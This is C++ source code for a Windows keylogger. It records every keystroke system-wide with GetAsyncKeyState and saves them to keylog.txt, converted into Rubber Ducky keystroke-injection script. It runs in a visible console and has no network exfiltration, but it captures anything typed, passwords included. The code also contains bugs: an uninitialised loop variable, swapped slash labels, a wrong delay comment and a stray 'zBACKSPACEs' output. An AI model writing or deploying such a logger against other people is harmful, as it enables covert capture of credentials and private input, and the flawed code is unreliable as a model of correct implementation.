#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>

//logs key inputs, formats it into rubby ducky language and saves it to a file

using namespace std;

int Save(string file);

int main() {
    string file = "keylog.txt"; //file to save the keylog to (must use .c_str() to conver to char*)
    //capital letters A-Z
    int hexKey[] = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A};

    cout << "- - - Press ALT to start keylogger - - -" << endl;
    //cout << "F1" << endl;
    cout << "Keylogger started, will be saved to " << file << endl;
    Save(file); //main function which saves to file 
    cout << endl << "Keylogger finished, key strokes save in " << file << endl; 

}

int Save(string file){
    ofstream fout;

    unsigned char i;
    unsigned char prevkey = 0;
    bool bisString = false;
    int isString = 0;
    string delay = "DELAY 3000"; //delay for 3 seconds

    //end by pressing ESC key
    while(i != 27) 
    { 
        Sleep(300); //sleep for 100ms to prevent high CPU usage
        
        for(i = 8; i <= 255; i++) 
        {
            //use standard windows api function to (only pressed keys)
            if(GetAsyncKeyState(i) == -32767) 
            {
                //cout << int(GetAsyncKeyState(i)) << endl;
                //ios::out is used to create a file, if it already exists it will be overwritten
                //ios::app is used to append to file, cannot edit original contents
                fout.open(file.c_str(), ios::app);
                if(!fout) {
                    cout << "Error opening file" << endl;
                    return 1; //exit if file cannot be opened
                }
                //string sequence starts/stops with ALT + 1
                if(GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(0x31) & 0x8000)
                {
                    if(isString%2 == 0){
                        //starts a string command in ducky language
                        bisString = true;
                        fout << "STRING ";
                        cout << "STRING ";
                    }
                    else {
                        //ends a string command in duckky language
                        bisString = false;
                        cout << endl;
                        cout << delay << endl;
                    }
                isString++;
                }
                    
                if(i >= 65 && i <= 90) 
                {
                    if(!(GetAsyncKeyState(VK_SHIFT) & 0x8000) && bisString) {
                        fout << char(i + 32);
                        cout << char(i + 32);
                    } else {
                        fout << char(i);
                        cout << char(i);
                    }
                } else if (i > 0X30 && i < 0X39 )
                {
                    fout << char(i);
                    cout << char(i);
                }
                if(!bisString)
                {
                    switch(i) 
                    {
                        //windows control keys
                        case VK_BACK: fout << "BACKSPACE"; cout << "BACKSPACE"; break;
                        case VK_TAB: fout << "TAB"; cout << "TAB"; break;
                        case VK_RETURN: fout << "ENTER"; cout << "ENTER"; break;
                        //case 0X10: fout << "SHIFT"; cout << "SHIFT" << " " << int(0x10); break;
                        //case VK_CONTROL: fout << "CTRL"; cout << "CTRL"; break;
                        //case VK_MENU: fout << "ALT"; cout << "ALT" << int(0x12); break;
                        case VK_CAPITAL: fout << "CAPSLOCK"; cout << "CAPSLOCK"; break;
                        case VK_ESCAPE: fout << "ESCAPE"; cout << "ESCAPE"; break;
                        case VK_LWIN: fout << "GUI"; cout << "GUI"; break;                            
                        //special characters
                        case 0xBC: fout << "COMMA"; cout << "COMMA"; break;
                        case VK_OEM_PERIOD: fout << "PERIOD"; cout << "PERIOD"; break;
                        case VK_OEM_1: fout << "SEMICOLON"; cout << "SEMICOLON"; break;
                        case VK_OEM_2: fout << "BACKSLASH"; cout << "BACKSLASH "; break;                        
                        case VK_OEM_3: fout << "TILDE"; cout << "TILDE"; break; //top left corner of keyboard
                        case VK_OEM_4: fout << "LEFTBRACKET"; cout << "LEFTBRACKET"; break;
                        case VK_OEM_5: fout << "FORWARDSLASH"; cout << "FORWARDSLASH"; break;
                        case VK_OEM_6: fout << "RIGHTBRACKET"; cout << "RIGHTBRACKET"; break;
                        case VK_OEM_7: fout << "QUOTE"; cout << "QUOTE"; break;
                        case VK_SPACE: fout << "SPACE"; cout << "SPACE"; break;
                        case VK_LEFT: fout << "LEFT"; cout << "LEFT"; break;
                        case VK_RIGHT: fout << "RIGHT"; cout << "RIGHT"; break;
                        case VK_UP: fout << "UP"; cout << "UP "; break;
                        case VK_DOWN: fout << "DOWN"; cout << "DOWN"; break;
                        //shortcut keys
                        case VK_INSERT: fout << "INSERT"; cout << "INSERT"; break;
                        case VK_HOME: fout << "HOME"; cout << "HOME"; break;
                        case VK_END: fout << "END"; cout << "END"; break;
                        case VK_PRIOR: fout << "PAGEUP"; cout << "PAGEUP"; break;
                        case VK_NEXT: fout << "PAGEDOWN"; cout << "PAGEDOWN"; break;
                        //F 1-12 keys
                        case 0x70: fout << "F1"; cout << "F1"; break;
                        case VK_F2: fout << "F2"; cout << "F2"; break;
                        case VK_F3: fout << "F3"; cout << "F3"; break;
                        case VK_F4: fout << "F4"; cout << "F4"; break;
                        case VK_F5: fout << "F5"; cout << "F5"; break;
                        case VK_F6: fout << "F6"; cout << "F6"; break;
                        case VK_F7: fout << "F7"; cout << "F7"; break;
                        case VK_F8: fout << "F8"; cout << "F8"; break;
                        case VK_F9: fout << "F9"; cout << "F9"; break;
                        case VK_F10: fout << "F10"; cout << "F10"; break;
                        case VK_F11: fout << "F11"; cout << "F11"; break;
                        case VK_F12: fout << "F12"; cout << "F12"; break;
                        case VK_NUMPAD0: fout << "NUMPAD0"; cout << "NUMPAD0"; break;
                        case VK_NUMPAD1: fout << "NUMPAD1"; cout << "NUMPAD1"; break;
                        case VK_NUMPAD2: fout << "NUMPAD2"; cout << "NUMPAD2"; break;
                        case VK_NUMPAD3: fout << "NUMPAD3"; cout << "NUMPAD3"; break;
                        case VK_NUMPAD4: fout << "NUMPAD4"; cout << "NUMPAD4"; break;
                        case VK_NUMPAD5: fout << "NUMPAD5"; cout << "NUMPAD5"; break;
                        case VK_NUMPAD6: fout << "NUMPAD6"; cout << "NUMPAD6"; break;
                        case VK_NUMPAD7: fout << "NUMPAD7"; cout << "NUMPAD7"; break;
                        case VK_NUMPAD8: fout << "NUMPAD8"; cout << "NUMPAD8"; break;
                        case VK_NUMPAD9: fout << "NUMPAD9"; cout << "NUMPAD9"; break;
                        case VK_MULTIPLY: fout << "MULTIPLY"; cout << "MULTIPLY"; break;
                        case VK_ADD: fout << "ADD"; cout << "ADD"; break;
                        case VK_SUBTRACT: fout << "SUBTRACT"; cout << "SUBTRACT"; break;
                        case VK_DECIMAL: fout << "DECIMAL"; cout << "DECIMAL"; break;
                        case VK_DIVIDE: fout << "DIVIDE"; cout << "DIVIDE"; break; 
                        default:
                        if(GetAsyncKeyState(VK_SHIFT) & 0x8000) 
                        {
                            int counter = 0;
                            //if key is not in the list, print the key code
                            for(unsigned char j = 0x30; j < 0x5A; j++){
                                if(counter == 0){
                                    fout << "SHIFT ";
                                    cout << "SHIFT ";
                                    }
                                counter++;
                                if( (GetAsyncKeyState(VK_SHIFT) & 0X8000) && (i == j) )
                                {
                                    //check all possible key cominnations with shift
                                    if(i > 0x41 && i < 0x5A)
                                    {
                                        fout << char(i);
                                        cout << char(i);
                                    }
                                    else if(i > 0x30 && i < 0x39)
                                    {
                                        fout << i;
                                        cout << i;
                                    }
                                    else{
                                        if (GetAsyncKeyState(VK_MENU) & 0x8000)
                                        {
                                            fout << "ALT";
                                            cout << "ALT";
                                        }
                                        else if (i == 0x13)
                                        {
                                            fout << "PAUSE";
                                            cout << "PAUSE";
                                        }
                                        else if (GetAsyncKeyState(VK_CAPITAL) & 0x8000)
                                        {
                                            fout << "CAPSLOCK";
                                            cout << "CAPSLOCK";
                                        }
                                        else if (i == 0x20)
                                        {
                                            fout << "SPACE";
                                            cout << "SPACE";
                                        }
                                        else if (i == 0x21)
                                        {
                                            fout << "PAGEUP";
                                            cout << "PAGEUP";
                                        }
                                        else if (i == 0x22)
                                        {
                                            fout << "PAGEDOWN";
                                            cout << "PAGEDOWN";
                                        }
                                        else if (i == 0x23)
                                        {
                                            fout << "END";
                                            cout << "END";
                                        }
                                        else if (i == 0x24)
                                        {
                                            fout << "HOME";
                                            cout << "HOME";
                                        }
                                        else if (i == 0x25)
                                        {
                                            fout << "LEFT";
                                            cout << "LEFT";
                                        }
                                        else if (i == 0x26)
                                        {
                                            fout << "UP";
                                            cout << "UP";
                                        }
                                        else if (i == 0x27)
                                        {
                                            fout << "RIGHT";
                                            cout << "RIGHT";
                                        }
                                        else if (i == 0x28)
                                        {
                                            fout << "DOWN";
                                            cout << "DOWN";
                                        }
                                        else if (i == 0x2D)
                                        {
                                            fout << "INSERT";
                                            cout << "INSERT";
                                        }
                                        else if (i == 0x2E)
                                        {
                                            fout << "DELETE";
                                            cout << "DELETE";
                                        }
                                        else if (i == 0x2F)
                                        {
                                            fout << "HELP";
                                            cout << "HELP";
                                        }
                                        else if(i == 0x70)
                                        {
                                            fout << "F1";
                                            cout << "F1";
                                        }
                                        else if(i == 0x71)
                                        {
                                            fout << "F2";
                                            cout << "F2";
                                        }
                                        else if(i == 0x72)
                                        {
                                            fout << "F3";
                                            cout << "F3";
                                        }
                                        else if(i == 0x73)
                                        {
                                            fout << "F4";
                                            cout << "F4";
                                        }
                                        else if(i == 0x74)
                                        {
                                            fout << "F5";
                                            cout << "F5";
                                        }
                                        else if(i == 0x75)
                                        {
                                            fout << "F6";
                                            cout << "F6";
                                        }
                                        else if(i == 0x76)
                                        {
                                            fout << "F7";
                                            cout << "F7";
                                        }
                                        else if(i == 0x77)
                                        {
                                            fout << "F8";
                                            cout << "F8";
                                        }
                                        else if(i == 0x78)
                                        {
                                            fout << "F9";
                                            cout << "F9";
                                        }
                                        else if(i == 0x79)
                                        {
                                            fout << "F10";
                                            cout << "F10";
                                        }
                                        else if(i == 0x7A)
                                        {
                                            fout << "F11";
                                            cout << "F11";
                                        }
                                        else if(i == 0x7B)
                                        {
                                            fout << "F12";
                                            cout << "F12";                                    
                                        }
                                        else if(i == 0x7C)
                                        {
                                            fout << "NUMLOCK";
                                            cout << "NUMLOCK";
                                        }
                                        else if(i == 0x7D)
                                        {
                                            fout << "SCROLLLOCK";
                                            cout << "SCROLLLOCK";
                                        }
                                        else if(i == 0x7E)
                                        {
                                            fout << "PRINTSCREEN";
                                            cout << "PRINTSCREEN";
                                        }
                                        else if(i == 0x7F)
                                        {
                                            fout << "PAUSE";
                                            cout << "PAUSE";
                                        }
                                        else if(i == 0x80)
                                        {
                                            fout << "INSERT";
                                            cout << "INSERT";
                                        }
                                        else if(i == 0x81)
                                        {
                                            fout << "DELETE";
                                            cout << "DELETE";
                                        }
                                        else if(i == 0x82)
                                        {
                                            fout << "HELP";
                                            cout << "HELP";
                                        }
                                        else if(i == 0x83)
                                        {
                                            fout << "NUMPAD0";
                                            cout << "NUMPAD0";
                                        }
                                        else if(i == 0x84)
                                        {
                                            fout << "NUMPAD1";
                                            cout << "NUMPAD1";
                                        }
                                        else if(i == 0x85)
                                        {
                                            fout << "NUMPAD2";
                                            cout << "NUMPAD2";
                                        }
                                        else if(i == 0x86)
                                        {
                                            fout << "NUMPAD3";
                                            cout << "NUMPAD3";
                                        }
                                        else if(i == 0x87)
                                        {
                                            fout << "NUMPAD4";
                                            cout << "NUMPAD4";
                                        }
                                        else if(i == 0x88)
                                        {
                                            fout << "NUMPAD5";
                                            cout << "NUMPAD5";
                                        }
                                        else if(i == 0x89)
                                        {
                                            fout << "NUMPAD6";
                                            cout << "NUMPAD6";
                                        }
                                        else if(i == 0x8A)
                                        {
                                            fout << "NUMPAD7";
                                            cout << "NUMPAD7";
                                        }
                                        else if(i == 0x8B)
                                        {
                                            fout << "NUMPAD8";
                                            cout << "NUMPAD8";
                                        }
                                        else if(i == 0x8C)
                                        {
                                            fout << "NUMPAD9";
                                            cout << "NUMPAD9";                                    
                                        }
                                        else if(i == 0x8D)
                                        {
                                            fout << "MULTIPLY";
                                            cout << "MULTIPLY";
                                        }
                                        else if(i == 0x8E)
                                        {
                                            fout << "ADD";
                                            cout << "ADD";
                                        }
                                        else if(i == 0x8F)
                                        {
                                            fout << "SUBTRACT";
                                            cout << "SUBTRACT";
                                        }
                                        else if(i == 0x90)
                                        {
                                            fout << "DECIMAL";
                                            cout << "DECIMAL";
                                        }
                                        else if(i == 0x91)
                                        {
                                            fout << "DIVIDE";
                                            cout << "DIVIDE";
                                        }
                                        else if(i == 0xC0)
                                        {
                                            fout << "TILDE";
                                            cout << "TILDE";
                                        }
                                        
                                    }

                                }
                            }
                                                        
                        }
                        else if(GetAsyncKeyState(VK_MENU) & 0x8000)
                        {
                            fout << "ALT";
                            cout << "ALT";                    
                        }
                        else if(GetAsyncKeyState(VK_CONTROL) & 0x8000)
                        {
                            fout << "CTRL";
                            cout << "CTRL";
                        }
                        break;                       
                    }
                }

                else
                {
                    switch(i) 
                    {
                        //windows control keys
                        case VK_BACK: fout << "zBACKSPACEs"; cout << "Will delete in file"; break;
                        case VK_TAB: fout << "\t"; cout << "\t"; break;
                        case VK_RETURN: fout << "\n"; cout << "\n" << delay << endl; break;
                            
                        //special characters
                        case 0xBC: fout << ","; cout << ","; break;
                        case VK_OEM_PERIOD: fout << "."; cout << "."; break;
                        case VK_OEM_1: fout << ";"; cout << ";"; break;
                        case VK_OEM_2: fout << "/"; cout << ";"; break;                        
                        case VK_OEM_3: fout << "`"; cout << "`"; break; //top left corner of keyboard
                        case VK_OEM_4: fout << "["; cout << "["; break;
                        case VK_OEM_6: fout << "]"; cout << "]"; break;
                        case VK_OEM_5: fout << "\\"; cout << "\\"; break;
                        case VK_OEM_7: fout << "'"; cout << "'"; break;
                        case VK_SPACE: fout << " "; cout << " "; break;
                        
                        //F 1-12 keys and numpad keys`
                        case VK_NUMPAD0: fout << "0"; cout << "0"; break;
                        case VK_NUMPAD1: fout << "1"; cout << "1"; break;
                        case VK_NUMPAD2: fout << "2"; cout << "2"; break;
                        case VK_NUMPAD3: fout << "3"; cout << "3"; break;
                        case VK_NUMPAD4: fout << "4"; cout << "4"; break;
                        case VK_NUMPAD5: fout << "5"; cout << "5"; break;
                        case VK_NUMPAD6: fout << "6"; cout << "6"; break;
                        case VK_NUMPAD7: fout << "7"; cout << "7"; break;
                        case VK_NUMPAD8: fout << "8"; cout << "8"; break;
                        case VK_NUMPAD9: fout << "9"; cout << "9"; break;
                        case VK_MULTIPLY: fout << "*"; cout << "*"; break;
                        case VK_ADD: fout << "+"; cout << "+"; break;
                        case VK_SUBTRACT: fout << "-"; cout << "-"; break;
                        case VK_DECIMAL: fout << "."; cout << "."; break;
                        case VK_DIVIDE: fout << "/"; cout << "/"; break;                        
                    }
                }

                if((i >= 8 && i <= 222) && i != prevkey) //check if multiple keys are pressed at the same time
                {
                    if (i == 27){
                        break;
                    }   

                } else 
                {
                    i = 0;
                    cout << " . . . " ; //DEBUG KEYS
                }
                if(!bisString)
                {
                    fout << endl;
                    cout << endl;
                }

                fout.close();
            }
            
        }
        
    }
    return 0;
}